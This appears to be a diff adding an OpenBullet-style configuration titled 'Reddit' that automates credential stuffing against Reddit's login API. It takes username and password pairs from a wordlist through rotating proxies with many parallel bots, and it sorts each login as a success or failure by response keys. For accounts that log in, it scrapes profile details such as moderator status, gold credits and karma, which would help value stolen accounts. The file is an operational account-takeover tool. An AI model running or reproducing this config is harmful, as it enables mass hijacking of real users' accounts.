@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "Reddit",
+  "SuggestedBots": 150,
+  "LastModified": "2018-05-15T22:03:05.6503461+00:00",
+  "AdditionalInfo": "",
+  "Author": "Chaos",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Post REQUEST POST "https://www.reddit.com/api/login/<USER>" AutoRedirect=TRUE 
+  CONTENT "op=login&user=<USER>&passwd=<PASS>&api_type=json" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; SM-N950F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "DNT: 1" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "modhash" 
+  KEYCHAIN Failure OR 
+    KEY "WRONG_PASSWORD" 
+    KEY "BAD_USERNAME" 
+    KEY "INCORRECT_USERNAME_PASSWORD" 
+#Get_User_Data REQUEST GET "https://www.reddit.com/user/<USER>" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; SM-N950F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Is_Verified_? PARSE "<SOURCE>" LR "ied\":" "," Recursive=FALSE -> CAP "verified" "" "" 
+#Is_Suspended_? PARSE "<SOURCE>" LR "ded\":" "," Recursive=FALSE -> CAP "Suspended" "" "" 
+#Is_Mod_? PARSE "<SOURCE>" LR "od\":" "," Recursive=FALSE -> CAP "Is Mod" "" "" 
+#Is_In_Beta_? PARSE "<SOURCE>" LR "nBeta\":" "," Recursive=FALSE -> CAP "Is In Beta" "" "" 
+#Is_Gold_? PARSE "<SOURCE>" LR "ld\":" "," Recursive=FALSE -> CAP "Is Gold" "" "" 
+#Gold_Credits PARSE "<SOURCE>" LR "its\":" "," Recursive=FALSE -> CAP "Gold Credits" "" "" 
+#Comment_Karma PARSE "<SOURCE>" LR "tKarma\":" "," Recursive=FALSE -> CAP "Comment Karma" "" "" 
+#Link_Karma PARSE "<SOURCE>" LR "ma\":" "," Recursive=FALSE -> CAP "Link Karma" "" "" 
